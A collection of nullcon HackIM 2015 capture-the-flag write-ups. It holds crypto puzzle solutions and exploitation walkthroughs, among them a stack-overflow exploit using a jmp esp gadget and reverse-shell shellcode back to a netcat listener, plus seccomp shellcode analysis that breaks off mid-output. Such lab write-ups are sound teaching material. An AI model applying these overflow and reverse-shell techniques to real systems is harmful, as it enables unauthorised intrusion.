>TaPoGeTaBiGePoHfTmGeYbAtPtHoPoTaAuPtGeAuYbGeBiHoTaTmPtHoTmGePoAuGeErTaBiHoAuRnTmPbGePoHfTmGeTmRaTaBiPoTmPtHoTmGeAuYbGeTbGeLuTmPtTmPbTbOsGePbTmTaLuPtGeAuYbGeAuPbErTmPbGeTaPtGePtTbPoAtPbTmGeTbPtErGePoAuGeYbTaPtErGePoHfTmGeHoTbAtBiTmBiGeLuAuRnTmPbPtTaPtLuGePoHfTaBiGeAuPbErTmPbPdGeTbPtErGePoHfTaBiGePbTmYbTmPbBiGeTaPtGeTmTlAtTbOsGeIrTmTbBiAtPbTmGePoAuGePoHfTmGePbTmOsTbPoTaAuPtBiGeAuYbGeIrTbPtGeRhGeBiAuHoTaTbOsGeTbPtErGeHgAuOsTaPoTaHoTbOsGeRhGeTbPtErGePoAuGePoHfTmGeTmPtPoTaPbTmGeAtPtTaRnTmPbBiTmGeTbBiGeTbGeFrHfAuOsTmPd

## Write-up

by [polym](https://github.com/abpolym)

If you had chemistry in school, you'll notice quickly that each two characters represent chemical symbols for different chemical elements out of the periodic table, e.g. `Ta` means `Tantalum`.

Each atom of a chemical element also has a [unique count](http://en.wikipedia.org/wiki/Atomic_number) of protons, e.g. `Ta` has the atomic number `73`.

Decoding the ciphertext with a [self-written script](chemical.py) results in the following cleartext:

> IT IS THE FUNCTION OF SCIENCE TO DISCOVER THE EXISTENCE OF A GENERAL REIGN OF ORDER IN NATURE AND TO FIND THE CAUSES GOVERNING THIS ORDER. AND THIS REFERS IN EQUAL MEASURE TO THE RELATIONS OF MAN - SOCIAL AND POLITICAL - AND TO THE ENTIRE UNIVERSE AS A WHOLE.

The task here is to find the "general reign of order in nature" or rather guess, where these atomic numbers are specified - in the `periodic table`.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-crypto-100/>
* <http://blog.tinduong.pw/nullcon-hackim-2014-write-ups/#crayon-54bed0c4c778b288261421>
* [Spanish](https://blog.ka0labs.net/post/20/)
* [Portuguese](https://ctf-br.org/wiki/nullcon-hackim/nullcon-hackim-2015/c100-question-1/)
# nullcon HackIM 2015: Crypto Question 2

**Category:** Crypto
**Points:** 100
**Author:**
**Description:**

>A message has been intercepted from Alice to Bob. Decode and find the flag.
>
>Message:
>11313221111241132131614122141231311261112124131111132131623212141221322111131312141321222141621211124114212162114241131222211121623122211112211112133162321214121211135321221412121112112113221221111221416231242121613111131222211121124163221214216352123221111241132212211121621322141311322111216241121322214163111113221221112163113211422111216213222111131321623212141221322111231131721142123213221142312262131221112222221111222212411222322132221221322111123222311221112211421322312211423122111112312231222143212221322221135111211111321142411213221112132221126111215112123211211232122111

## Write-up

by [jagotu](https://github.com/jagotu)

First thing we'll notice is that the distribution of the numbers is very uneven:

1: 261  
2: 202  
3: 66  
4: 31  
5: 4  
6: 19  
7: 1  
8: 0  
9: 0

We can see that small numbers occur way more often than large ones. This hints that the message uses [run-length encoding](https://en.wikipedia.org/wiki/Run-length_encoding), most likely encoding the binary represantation of an string. As all ASCII chars begin with a 0, we know that we should start by zeros. Every number of the message corresponds to the number of repetitions of 0 or 1.

Sample python code:
```python
import sys
input = "113132...1"

c = 0
for i in range(len(input)):
    sys.stdout.write(str(c) * int(input[i]))
    c = 1 - c
```

When the output is interpreted in ASCII, we get the resulting message:
>Dear Bob,  
>Our codeword may have been compromised by Eve, so please note and use the new code: 4674107e353af23dec1e471415bbd923.  
>Thanks,  
>Alice  

## Other write-ups and resources

* none yet# nullcon HackIM 2015: Crypto Question 3

**Category:** Crypto
**Points:** 200
**Author:**
**Description:**

> Server running at: 54.165.191.231:2002

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: Crypto Question 4

**Category:** Crypto
**Points:** 300
**Author:**
**Description:**

> Server running at: 54.165.191.231:2003

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: Crypto Question 5

**Category:** Crypto
**Points:** 500
**Author:**
**Description:**

> Server running at: 54.165.191.231:2004

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# nullcon HackIM 2015: Exploitation 100

**Category:** Exploitation
**Points:** 100
**Author:**
**Description:**

> 54.163.248.69:9000
>
>	[Binary](srv1.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/hackim-2015-exploit-100/>
* <http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-1.html>

### Meta

Keywords:

* Stack Overflow - `jump to register`
* Reverse Shell

We are given a gzipped compressed tar archive that we first extract using `tar xvf srv1.tar.gz` to find a binary, `srv`.

This binary is a stripped 32bit ELF for i386 Linux:

```bash
$ file srv
srv: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=cd9e665e7eaca837dce5d0e16627aad2c64866a2, stripped
```

Running the binary:

```bash
$ ./srv
<input>
```

Nothing obvious happens, so we apply `ltrace` to it to find interesting library calls:

```bash
$ ltrace ./srv
__libc_start_main(0x8048de1, 1, 0xff8bcff4, 0x8048df0 <unfinished ...>
socket(2, 1, 6)                                                                                               = 3
setsockopt(3, 1, 2, 0xff8bcf10)                                                                               = 0
inet_addr("0.0.0.0")                                                                                          = 0
htons(9000, 1, 2, 0xff8bcf10)                                                                                 = 0x2823
bind(3, 0xff8bcf28, 16, 0xff8bcf10)                                                                           = 0
listen(3, 100, 16, 0xff8bcf10)                                                                                = 0
signal(SIGCHLD, 0x1)                                                                                          = 0
accept(3, 0xff8bcf18, 0xff8bcf14, 0xff8bcf10 <no return ...>
--- SIGWINCH (Window changed) ---
```

Looks like the binary forks/creates a child that listens on port `9000`. We run `srv` without `ltrace` and connect to the port:

```bash
$ nc localhost 9000
fash$ help
Error - unsupported command
$ nc localhost 9000
fash$ echo hi
echo: hi
```

The father also speaks:

```bash
$ ./srv
Received client from 127.0.0.1:37372
Processing client: pid: 2388 socket: 4
Received client from 127.0.0.1:37373
Processing client: pid: 2390 socket: 4
```

Our first try is to cause a stack overflow:

```bash
$ python -c 'print "echo "+"A"*300' | nc localhost 9000
fash$ $
```

Well it seems it crashes, but gives us no output. As [this writeup suggests](https://ctf-team.vulnhub.com/hackim-2015-exploit-100/) you might be able to create a gdb core dump.

This can be done via following steps:

* Load the binary `srv` in `gdb` and tell `gdb` to follow childs with `set follow-fork-mode child`
* Run the binary with `r` or `run`
* Provide your input to the child by piping your stack overflow input to `nc localhost 9000`: `python -c 'print "echo "+ "A"*0x500' | nc localhost 9000`
* You'll then receive a SIGSEGV in `gdb`:
```bash
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/nullcon/exploit-1/srv
Received client from 127.0.0.1:37413
[New process 3482]
Processing client: pid: 3482 socket: 4

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3482]
[----------------------------------registers-----------------------------------]
EAX: 0xffffffff 
EBX: 0x1 
ECX: 0xffffffbc 
EDX: 0x1 
ESI: 0x10 
EDI: 0xffffb4f0 ('A' <repeats 200 times>...)
EBP: 0x41414141 ('AAAA')
ESP: 0xffffb440 ('A' <repeats 200 times>...)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffb440 ('A' <repeats 200 times>...)
0004| 0xffffb444 ('A' <repeats 200 times>...)
0008| 0xffffb448 ('A' <repeats 200 times>...)
0012| 0xffffb44c ('A' <repeats 200 times>...)
0016| 0xffffb450 ('A' <repeats 200 times>...)
0020| 0xffffb454 ('A' <repeats 200 times>...)
0024| 0xffffb458 ('A' <repeats 200 times>...)
0028| 0xffffb45c ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```
* Create a core dump in `gdb` with `generate-core-file` ([Source](http://stackoverflow.com/questions/3789550/saving-core-file-in-gdb))

If you try other vulnerabilities - other than stack overflow - such as Format String Vulnerability or other, you don't get far.

To debug more, we apply `strace -f` and `ltrace -f` (`f`ollow childs, too) to the binary and try our stack overflow again:

```bash
$ python -c 'print "echo "+"A"*300' | nc localhost 9000
fash$ $
```

`ltrace` output:

```bash
$ ltrace -f ./srv 
[pid 2540] __libc_start_main(0x8048de1, 1, 0xff8882d4, 0x8048df0 <unfinished ...>
[pid 2540] socket(2, 1, 6)                                                                                    = 3
[pid 2540] setsockopt(3, 1, 2, 0xff8881f0)                                                                    = 0
[pid 2540] inet_addr("0.0.0.0")                                                                               = 0
[pid 2540] htons(9000, 1, 2, 0xff8881f0)                                                                      = 0x2823
[pid 2540] bind(3, 0xff888208, 16, 0xff8881f0)                                                                = 0
[pid 2540] listen(3, 100, 16, 0xff8881f0)                                                                     = 0
[pid 2540] signal(SIGCHLD, 0x1)                                                                               = 0
[pid 2540] accept(3, 0xff8881f8, 0xff8881f4, 0xff8881f0)                                                      = 4
[pid 2540] ntohs(2962)                                                                                        = 37387
[pid 2540] inet_ntoa({ 0x100007f })                                                                           = "127.0.0.1"
[pid 2540] printf("Received client from %s:%d\n", "127.0.0.1", 37387Received client from 127.0.0.1:37387
)                                         = 37
[pid 2540] fork()                                                                                             = 2543
[pid 2540] close(4)                                                                                           = 0
[pid 2540] accept(3, 0xff8881f8, 0xff8881f4, 0xff8881f0 <unfinished ...>
[pid 2543] <... fork resumed> )                                                                               = 0
[pid 2543] getpid()                                                                                           = 2543
[pid 2543] printf("Processing client: pid: %d socke"..., 2543, 4Processing client: pid: 2543 socket: 4
)                                             = 39
[pid 2543] close(3)                                                                                           = 0
[pid 2543] strlen("fash$ ")                                                                                   = 6
[pid 2543] send(4, 0x8048eac, 6, 0)                                                                           = 6
[pid 2543] select(5, 0xff886120, 0, 0)                                                                        = 1
[pid 2543] memset(0xff8861a0, '\0', 8192)                                                                     = 0xff8861a0
[pid 2543] recv(4, 0xff8861a0, 8191, 0)                                                                       = 306
[pid 2543] strchr("echo AAAAAAAAAAAAAAAAAAAAAAAAAAA"..., ' ')                                                 = " AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...
[pid 2543] strcmp("echo", "echo")                                                                             = 0
[pid 2543] memset(0xff886070, '\0', 100)                                                                      = 0xff886070
[pid 2543] sprintf("echo: AAAAAAAAAAAAAAAAAAAAAAAAAA"..., "echo: %s\n", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 308
[pid 2543] strlen("echo: AAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                      = 308
[pid 2543] send(0x41414141, 0xff886070, 308, 0)                                                               = 0xffffffff
[pid 2543] --- SIGSEGV (Segmentation fault) ---
[pid 2543] +++ killed by SIGSEGV +++
[pid 2540] --- SIGWINCH (Window changed) ---
```

`strace` output:

```bash
$ strace -f ./srv
execve("./srv", ["./srv"], [/* 31 vars */]) = 0
[ Process PID=2534 runs in 32 bit mode. ]
brk(0)                                  = 0x860c000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7790000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=116837, ...}) = 0
mmap2(NULL, 116837, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7773000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\233\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1742588, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7772000
mmap2(NULL, 1747580, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff75c7000
mmap2(0xf776c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a5000) = 0xfffffffff776c000
mmap2(0xf776f000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff776f000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff75c6000
set_thread_area(0xffaed260)             = 0
mprotect(0xf776c000, 8192, PROT_READ)   = 0
mprotect(0x804a000, 4096, PROT_READ)    = 0
mprotect(0xf77b2000, 4096, PROT_READ)   = 0
munmap(0xf7773000, 116837)              = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9000), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 100)                          = 0
rt_sigaction(SIGCHLD, {SIG_IGN, [CHLD], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
accept(3, {sa_family=AF_INET, sin_port=htons(37386), sin_addr=inet_addr("127.0.0.1")}, [16]) = 4
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 23), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff778f000
write(1, "Received client from 127.0.0.1:3"..., 37Received client from 127.0.0.1:37386
) = 37
clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0) = 2537
close(4)                                = 0
accept(3, Process 2537 attached
 <unfinished ...>
[pid  2537] write(1, "Processing client: pid: 2537 soc"..., 39Processing client: pid: 2537 socket: 4
) = 39
[pid  2537] close(3)                    = 0
[pid  2537] send(4, "fash$ ", 6, 0)     = 6
[pid  2537] select(5, [4], NULL, NULL, {10, 0}) = 1 (in [4], left {9, 990649})
[pid  2537] recv(4, "echo AAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 8191, 0) = 306
[pid  2537] send(1094795585, "echo: AAAAAAAAAAAAAAAAAAAAAAAAAA"..., 308, 0) = -1 EBADF (Bad file descriptor)
[pid  2537] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
[pid  2537] +++ killed by SIGSEGV (core dumped) +++
<... accept resumed> 0xffaed358, [16])  = ? ERESTARTSYS (To be restarted if SA_RESTART is set)
--- SIGWINCH {si_signo=SIGWINCH, si_code=SI_KERNEL} ---
accept(3,
```

We can see following information:

* `ltrace` tells us the flow of consecutive library calls:
  * Fill memory space at `0xff8861a0` of size `8192` with zero byte characters.
  * Receive `8191` bytes from file descriptor `4` (Most likely our client connection) and store it into `0xff8861a0`
  * Locate the character ` ` (space) in our input (`strchr`) and compare the preceding characters with `echo` (`strcmp`)
  * Fill memory space at `0xff886070` of size `100` with zero byte characters
  * Write "echo " + input again into a buffer (most likely the last address `0xff886070`)
  * Determine the length of the resulting string with `strlen` and send back to us
  * Stack Overflow is happening when providing too much input
* `strace` tells us that we tried to access the address `0x41414141` (`si_addr`), which triggered a Segfault Trap `SIGSEGV`:
  * `SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141}`

After playing around with several offsets, we find that we need `118` bytes to overwrite `EIP`:

```bash
$ p -c 'print "echo "+"A"*118+"BBBB"' | nc localhost 9000
fash$
```

`strace -f srv` output (look at `si_addr`):

```bash
[...]
[pid  2987] close(3)                    = 0
[pid  2987] send(4, "fash$ ", 6, 0)     = 6
[pid  2987] select(5, [4], NULL, NULL, {10, 0}) = 1 (in [4], left {9, 994064})
[pid  2987] recv(4, "echo AAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 8191, 0) = 128
[pid  2987] send(2570, "echo: AAAAAAAAAAAAAAAAAAAAAAAAAA"..., 130, 0) = -1 EBADF (Bad file descriptor)
[pid  2987] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
[pid  2987] +++ killed by SIGSEGV (core dumped) +++
<... accept resumed> 0xffeb7018, [16])  = ? ERESTARTSYS (To be restarted if SA_RESTART is set)
--- SIGWINCH {si_signo=SIGWINCH, si_code=SI_KERNEL} ---
```


Reversing the binary with `radare2` yields deeper results as having a quick look at `strace` and `ltrace`:

First, print all functions determined by `radare2`:

```bash
[0x080487b0]> aa
[0x080487b0]> afl | sort -k1 | column -t
0x08048600  16   2   sym.imp.setsockopt
0x08048610  16   2   sym.imp.strcmp
0x08048620  16   2   sym.imp.printf
0x08048630  16   2   sym.imp.inet_ntoa
0x08048640  16   2   sym.imp.signal
0x08048650  16   2   sym.imp.select
0x08048660  16   2   sym.imp.htons
0x08048670  16   2   sym.imp.accept
0x08048680  16   2   sym.imp.getpid
0x080486a0  16   2   sym.imp.exit
0x080486b0  16   2   sym.imp.strchr
0x080486c0  16   2   sym.imp.strlen
0x080486d0  16   2   sym.imp.__libc_start_main
0x080486e0  16   2   sym.imp.bind
0x080486f0  16   2   sym.imp.memset
0x08048700  16   2   sym.imp.fork
0x08048710  16   2   sym.imp.listen
0x08048720  16   2   sym.imp.ntohs
0x08048730  16   2   sym.imp.sprintf
0x08048740  16   2   sym.imp.socket
0x08048750  16   2   sym.imp.inet_addr
0x08048760  16   2   sym.imp.shutdown
0x08048770  16   2   sym.imp.recv
0x08048780  16   2   sym.imp.close
0x08048790  16   2   sym.imp.__assert_fail
0x080487a0  16   2   sym.imp.send
0x080487b0  34   1   entry0
0x08048c00  481  10  fcn.08048c00
0x08048de1  13   1   main
```

Nonimported functions (those without `imp`) seem to be `fcn.08048c00` and `main`. `entry0` is our entry point, which usually calls `__libc_start_main `:

If you look very closely, you can notice that the binary count (second column) and function offsets (first column) don't match up.
This means that `radare2` was not able to find all functions in the stripped binary.
Add `34` (`0x22`) bytes to the address for `entry0` (`0x080487b0`) and you get `0x80487d2` which is not equal to the next function offset `0x08048c00`.

![](./entry0.png)

Decompiling `main`:

![](./main.png)

`main` just calls `fcn.08048c00`:

![](./fcn-08048c00.png)

`fcn.08048c00` jumps to another unknown address, `0x80489ef`. Decompiling 120 instructions `pd 100`:

![](./fcn-080489ef.png)

We notice the following:

* `fcn.080489ef` most likely ends with the `ret` instruction at `0x08048b9a`
* Before that, it jmps to `0x8048908`

Decompiling `fcn.08048908` (this time decompiling number of bytes `pD 231`:

![](./fcn-08048908.png)

We notice that this most likely is our child's code.

`gdb-peda` tells us that (almost) no binary-side securities have been enabled:

```bash
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

However, the server could have enabled [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), and since we can't leak any stack addresses and don't know offsets to imported libraries (none provided), we have to find an interesting gadget in the binary itself to jump to.

As the [Wikipedia entry for Buffer Overflow](https://en.wikipedia.org/wiki/Buffer_overflow#The_jump_to_address_stored_in_a_register_technique) suggests, something like `jmp esp` - aka jumping to a modified or known register that contains our shellcode would be nice.

Luckily, we find such a gadget at address `0x080488b0` using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget):

```bash
$ ROPgadget --binary ./srv --only 'jmp'
Gadgets information
============================================================
0x0804913b : jmp ecx
0x08049093 : jmp edi
0x080488b0 : jmp esp

Unique gadgets found: 3
```

Confirm it with `radare2`:

![](jmp-esp.png)

To get the flag, we combine all our gathered knowledge:

* Overflow the buffer with `118` bytes
* Force the program to jump to our shellcode by supplying the address `0x080488b0` for `jmp esp` to `EIP`
* Find a suitable shellcode

Regarding the shellcode, we cannot use the standard shellcode provided by `pwntools`' `shellcraft` like [this python script](./solve-1.py):

```bash
$ PS1='localshell $ '
localshell $ python solve-1.py
[+] Opening connection to localhost on port 9000: Done
fash$ 
[*] Closed connection to localhost port 9000
```

The shell appears on the wrong side, namely on our server, `srv`:

```bash
$ PS1='remoteserver $ '
remoteserver $ ./srv
Received client from 127.0.0.1:37405
Processing client: pid: 3112 socket: 4
$ ls
solve-1.py  srv  srv1.tar.gz
```

We have to force the program to give us shell using another method: Opening a backdoor using a reverse shell. See [here](http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/) and [here](http://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/) how it works. Effectively, you switch server and client, e.g. to avoid filtered ports:

* First, listen on your local machine on a given port, e.g. `netcat -l 127.1.1.1 -vp 11111`
* Then, force the remote program to contact your local machine and execute the shellcode on successful contact, essentially providing a shell

I found [this tiny reverse shell on shell-storm](http://shell-storm.org/shellcode/files/shellcode-838.php) and modified it to fit my needs in [this python code](./solve-2.py).

Listen on our local machine:

```bash
$ PS1='localmachine $ '
localmachine $ netcat -l 127.1.1.1 -vp 11111
Listening on [127.1.1.1] (family 0, port 11111)
```

The server runs on the remote machine:

```bash
$ PS1='remotemachine $ '
remotemachine $ ./srv
```

And we run our exploit from another terminal at our local machine:

```bash
$ PS1='exploiter $ '
exploiter $ python solve-2.py
[+] Opening connection to localhost on port 9000: Done
fash$ 
[*] Closed connection to localhost port 9000
exploiter $
```

Back to `srv`, we see a connection:

```bash
remotemachine $ ./srv
Received client from 127.0.0.1:37411
Processing client: pid: 3352 socket: 4
```

And if we type something into our `netcat` victim listener, we have a connection (for testing purposes from `127.0.01` port `58956` ) and thus a shell.

Now, we can execute commands!

```bash
Connection from [127.0.0.1] port 11111 [tcp/*] accepted (family 2, sport 58956)
ls
flag.txt
solve-1.py
solve-2.py
srv
srv1.tar.gz
cat flag.txt
aleph1-to-the-rescue++
localmachine $
```

The flag is `aleph1-to-the-rescue++`!

NOTE: Your IP or Port should not contain any nullbytes (`\x00`) or any other bytes that cause functions such as `sprintf`, `scanf` etc to abort reading your input too early.

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/hackim-2015-exploit-100/>
* <http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-1.html>
* [Japanese](http://toriaezukaite.blogspot.de/2015/01/hackim-2015-exploitation-question-1.html)
# nullcon HackIM 2015: Exploitation 200

**Category:** Exploitation
**Points:** 200
**Author:**
**Description:**

> 54.163.248.69:9001
>
>	[Binary](sbox.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://www.pawpetersen.dk/nullcon-hackim-2015-exploitation-question-2/>
* <https://ctf-team.vulnhub.com/hackim-2015-exploit-200/> or <http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/>
* <http://v0ids3curity.blogspot.in/2015/01/hackim-ctf-2014-exploitation-2.html>

### Meta

Keywords:

* [seccomp](https://en.wikipedia.org/wiki/Seccomp) sandboxing
* Provide shellcode to program

We are given a non-stripped i386 32bit ELF for Linux:

```bash
$ file sbox
sbox: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4a1f7a461b8539b7e230cafbf628cf55d465c61e, not stripped
```

Running it the first time:

```bash
$ ./sbox
./sbox: error while loading shared libraries: libseccomp.so.2: cannot open shared object file: No such file or directory
```

I'm running the binary on an Ubuntu 14.04:

```bash
$ lsb_release -r
Release:        14.04
```

To install the needed library (for i386 architecture) for this challenge, we do the following:

```bash
$ sudo apt-get install libseccomp2:i386
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following NEW packages will be installed:
  libseccomp2:i386
0 upgraded, 1 newly installed, 0 to remove and 498 not upgraded.
Need to get 0 B/32,1 kB of archives.
After this operation, 101 kB of additional disk space will be used.
Selecting previously unselected package libseccomp2:i386.
(Reading database ... 188734 files and directories currently installed.)
Preparing to unpack .../libseccomp2_2.1.0+dfsg-1_i386.deb ...
Unpacking libseccomp2:i386 (2.1.0+dfsg-1) ...
Setting up libseccomp2:i386 (2.1.0+dfsg-1) ...
Processing triggers for libc-bin (2.19-0ubuntu6) ...
$ ./sbox
error: No such file or directory
$ echo 'd3sp3r4t3_sh3llc0d3' > flag.txt
$ ./sbox
hi
```

After providing a flag file, it seems we can provide input the binary - but nothing happens!

First, read what seccomp actually is, e.g. [here](https://en.wikipedia.org/wiki/Seccomp) to find out that it seems to be a sandbox to only allow certain system calls:

* `exit`
* `read`
* `write`
* `sigreturn`

If a syscall not listed above is called by the sandboxed process, it receives a `SIGKILL`.

Calling `strace` on our binary:

```bash
$ strace -s 256 -f ./sbox 2> /tmp/out 
hello
$ cat /tmp/out 
execve("./sbox", ["./sbox"], [/* 31 vars */]) = 0
[...]
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7726000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7724000
open("flag.txt", O_RDONLY)              = 3
read(3, "d3sp3r4t3_sh3llc0d3\n", 100)   = 20
close(3)                                = 0
rt_sigaction(SIGSEGV, {0x804876d, [SEGV], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGTRAP, {0x804876d, [TRAP], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGALRM, {0x804876d, [ALRM], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
alarm(10)                               = 0
brk(0)                                  = 0x9156000
brk(0x9177000)                          = 0x9177000
prctl(PR_SET_NO_NEW_PRIVS, 0x1, 0, 0, 0) = 0
prctl(PR_SET_SECCOMP, 0x2, 0x9156048, 0, 0) = 0
read(1, "hello\n", 8192)                = 6
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0xf7726000} ---
exit_group(1)                           = ?
+++ exited with 1 +++
```

We notice:

* Our input is `read` with size `8192`
* We get a Segmentation Fault Signal `SIGSEGV`
* Some weird stuff is happening with `alarm` and `sigacton`. It seems after a timer of `10` seconds we get an `SIGALRM` (`man 2 alarm` or `man 2 rt_sigaction` to read about it)

Decompiling the binary with `radare2` with `r2 -A ./sbox`, we have a look at the `main` functon's graph using `VV @ sym.main` and zoom out (`-`) to see several branches:

![](./main.png)

The node with `@@@@@` here is  `main`'s entry point, which is currently looked at and thus displayed as assembly on the left side.

We see a `jne 0x80487cc` jump instruction that branches to either the node `_87cc_` if the result of `cmp` is `n`ot `e`qual `0` (and thus `t`rue/green) or otherwise to `_87c7_` (the `f`alse branch).

If we <kbd>TAB</kbd> our way to the bottom, we see the `read` call with something interesting:

![](./read-eax.png)

Right after reading our input, a `call eax` is happening. If we look closely to the previous instructions, we notice:

* `read` stores our input into the content of the address stored at `esp + 0x2c`
* After `read`, the address of our input is stored again into `eax` with `mov eax, dword [esp + 0x2c]`
* Then the address, stored in `eax`, is moved to `esp+0x3c` with `mov dword [esp + 0x3c], eax`
* Then again the address of our input from `esp+0x3c` is stored into `eax`
* Finally, we `call eax`, essentially interpreting whatever is stored at the address as instructions and thus executing our input

That makes clear what the challenge authors wants us to do: Break out from the `seccomp` sandbox or leak information (e.g. our flag) using the allowed system calls.

We choose the easier solution (latter), which means we have to find out where our flag is stored!

Let's continue our static analysis with `radare2` - decompiling the function `main` with `pdf @ sym.main` to see the addresses:

![](./main-2.png)

Now, let's set a breakpoint with `gdb-peda` at `call eax` (addr: `0x080489e7`) and - since two `mmap` calls are also visible in the previous `strace` output - have a look at the memory:

```bash
gdb-peda$ vmmap 
Warning: not running or target is remote
Start      End        Perm      Name
0x08048550 0x08048a88 rx-p      /home/vbox/pwn/tasks/nullcon/exploit-2/sbox
0x08048154 0x08048ba0 r--p      /home/vbox/pwn/tasks/nullcon/exploit-2/sbox
0x08049f00 0x0804a050 rw-p      /home/vbox/pwn/tasks/nullcon/exploit-2/sbox
gdb-peda$ b *0x080489e7
Breakpoint 1 at 0x80489e7
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/nullcon/exploit-2/sbox 
AAAA
[----------------------------------registers-----------------------------------]
EAX: 0xf7fd6000 ("AAAA\n")
EBX: 0xf7fa8000 --> 0x1a9da8 
ECX: 0xf7fd6000 ("AAAA\n")
EDX: 0x2000 ('')
ESI: 0x0 
EDI: 0x0 
EBP: 0xffffd578 --> 0x0 
ESP: 0xffffd530 --> 0x1 
EIP: 0x80489e7 (<main+616>:     call   eax)
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80489db <main+604>:        mov    eax,DWORD PTR [esp+0x2c]
   0x80489df <main+608>:        mov    DWORD PTR [esp+0x3c],eax
   0x80489e3 <main+612>:        mov    eax,DWORD PTR [esp+0x3c]
=> 0x80489e7 <main+616>:        call   eax
   0x80489e9 <main+618>:        mov    DWORD PTR [esp],0x8048a99
   0x80489f0 <main+625>:        call   0x80485f0 <perror@plt>
   0x80489f5 <main+630>:        mov    eax,0x0
   0x80489fa <main+635>:        leave
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 --> 0x1 
0004| 0xffffd534 --> 0xf7fd6000 ("AAAA\n")
0008| 0xffffd538 --> 0x2000 ('')
0012| 0xffffd53c --> 0x0 
0016| 0xffffd540 --> 0xffffffff 
